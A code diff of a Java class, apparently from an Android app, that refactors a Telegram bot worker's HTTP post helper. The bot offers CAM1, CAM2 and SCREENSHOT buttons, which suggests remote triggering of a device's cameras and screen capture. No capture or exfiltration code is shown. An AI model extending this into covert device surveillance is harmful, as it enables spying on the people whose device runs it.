@@ -29,7 +29,6 @@ public class TelegramBotWorker implements Runnable {
             try {
                 Thread.sleep(interval);
             } catch (InterruptedException ie) {
-                // Thread was interrupted, probably on purpose. Exit the loop.
                 Thread.currentThread().interrupt();
                 break;
             } catch (Exception e) {
@@ -106,7 +105,7 @@ public class TelegramBotWorker implements Runnable {
             String token = ConfigLoader.getBotToken();
             String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
             String body = "{\"chat_id\":" + chatId + ",\"text\":\"Choose Command\",\"reply_markup\":{\"inline_keyboard\":[[{\"text\":\"CAM1\",\"callback_data\":\"CAM1\"},{\"text\":\"CAM2\",\"callback_data\":\"CAM2\"}], [{\"text\":\"SCREENSHOT\",\"callback_data\":\"SCREENSHOT\"}] ]}}";
-            post(urlStr, body);
+            post(urlStr, body, context);
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_SendMenu", e);
         }
@@ -120,13 +119,14 @@ public class TelegramBotWorker implements Runnable {
             String urlStr = "https://api.telegram.org/bot" + token + "/sendMessage";
             String msg = "Clicked: " + data;
             String body = "{\"chat_id\":" + chatId + ",\"text\":\"" + msg + "\"}";
-            post(urlStr, body);
+            post(urlStr, body, context);
         } catch (Exception e) {
             ErrorLogger.logError(context, "TelegramBotWorker_HandleCallback", e);
         }
     }
 
-    public void post(String urlStr, String jsonBody) {
+    // UPDATED: Made the method static and added a Context parameter
+    public static void post(String urlStr, String jsonBody, Context context) {
         try {
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
